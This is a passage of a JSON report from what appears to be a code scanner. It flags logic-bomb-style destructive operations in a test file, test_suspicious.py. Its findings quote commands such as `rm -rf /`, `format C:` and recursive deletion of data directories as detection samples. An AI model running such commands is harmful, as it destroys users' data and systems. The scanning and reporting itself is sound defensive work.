    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.826019"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_data')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.831013",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "a82e0bfe-7127-4cda-a587-814bbf91cd36",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.831013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('format C:')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.831013",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "b897c512-44cc-4b74-843a-d043b1cc9ccf",
    "last_modified": "",
    "line_number": 13,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "System formatting - Complete data destruction",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.831013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.831013",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "9c65b4a9-2b31-4043-bb6b-41f3b72ce309",
    "last_modified": "",
    "line_number": 14,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.831013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical_file.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.831013",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "124fb5f9-31eb-479a-a41e-3eb61382bdac",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.831013"
  }
]